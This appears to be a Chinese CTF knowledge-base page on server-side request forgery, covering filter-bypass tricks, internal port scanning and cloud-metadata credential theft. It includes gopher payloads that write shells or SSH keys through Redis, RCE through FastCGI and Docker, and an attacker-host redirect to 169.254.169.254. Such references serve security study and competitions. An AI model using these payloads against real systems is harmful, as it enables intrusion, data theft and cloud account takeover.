---
comments: true
---

# SSRF

> WEB · 知识域。服务端请求伪造:让服务器替你发起请求。标签:**基本利用**、**内网探测**、**文件读取**、**攻击内网应用**、**DoS攻击**。

## 触发特征

- 输入点要求 URL:webhook、头像导入、URL 预览、PDF 生成器(WeasyPrint/wkhtmltopdf)、`?url=` 参数。
- 内部服务提示:`localhost`、`127.0.0.1`、云 metadata。

## 基本利用

- 探测回环:`http://127.0.0.1:PORT`、`http://localhost`、`http://0.0.0.0`、`http://[::1]`。
- 绕过"仅允许外网"校验:十进制/八进制/十六进制 IP(`2130706433`)、`0177.0.0.1`、DNS 解析到 127 的域名(`localtest.me`)、重定向链(curl 跟随 302 到内网)、末尾点 `127.0.0.1.`。
- 协议面:`file://`、`gopher://`(任意 TCP 报文)、`dict://`、`ftp://`、`tftp://`;`gopher:///` 无 host 形式(35C3 2018)。
- Host 头直注 SSRF(MireaCTF);SNI 层把 FTP 流量走私进 HTTPS 通道(PlaidCTF 2018)。
- URL 解析分歧:代理按 `@` 前取 host,后端取后段(33C3 2016);`parse_url` @ 符号绕过(EKOPARTY CTF 2016);未转义点正则白名单绕过(Meepwn CTF Quals 2018)。

## 内网探测

- 端口扫描:时间差 + 报错差异区分开放/关闭;`dict://` 探 redis 快速批量。
- 常见内网目标清单:redis(6379,未授权→写 webshell/SSH key)、MySQL(3306)、memcached、ElasticSearch(9200)、Docker API(2375)、K8s(10250)、consul(8500)、fastcgi(9000)。
- DNS rebinding:TOCTOU 场景第一次解析外网过校验、第二次解析内网打服务(自建 authoritative DNS TTL=0)。
- 云 metadata:`http://169.254.169.254/latest/meta-data/`(AWS)、`http://100.100.100.200`(阿里云)→ AK/SK → 接管云资源。

## 文件读取

- `file:///flag`、`file:///etc/passwd`;受限时用 `file:///proc/self/environ`、`file:///proc/self/cwd/app.py`。
- PDF 生成器路线:WeasyPrint `file://` 附件读本地文件(CVE-2024-28184,Nullcon 2026);wkhtmltopdf 嵌 iframe/img 读内网。
- ImageMagick/exiftool 等本地解析器的 SSRF 变体(MVG/MSL)。

## 攻击内网应用

- **gopher 协议封装任意 TCP**:
  - redis:`*1\r\n$8\r\nflushall...` 写 crontab/SSH key/webshell;
  - MySQL 无密码认证报文 → 盲 SQLi(34C3 CTF 2017、AceBear 2018);
  - fastcgi → PHP-FPM 直接执行代码(SSRF 经典链)。
- Docker API RCE:`POST /containers/create` 挂载 `/` 再 `start` → exec(H7CTF 2025)。
- ElasticSearch Groovy `script_fields` RCE(VolgaCTF 2017); rogue MySQL server `LOAD DATA LOCAL INFILE` 读客户端文件(VolgaCTF 2018)。
- 出站 URL 攻击者可控 → 凭据泄露(应用自动带 Basic Auth/Cloud metadata 凭据访问攻击者 URL,ASIS Finals 2018)。
- CRLF 注入扩展:wget CRLF → SMTP 发信(SECCON 2017);SoapClient `_user_agent` CRLF 改方法(35C3 2018)。

## DoS攻击

- 内网大文件循环请求放大;`gopher` 连接不关闭占满连接池。
- DNS rebinding 无限循环请求;上传超大 XML 实体膨胀(亿级实体)。

## 工具速查

```bash
# gopher 打 redis 写 shell(URL 编码后)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
# 302 跳转服务(自建)
# http://attacker/redirect → 302 Location: http://169.254.169.254/
```

## 转向

- 打下内网服务后 → [渗透测试](../pen/index.md);云 metadata 拿到凭证 → [云安全](../cld/index.md)
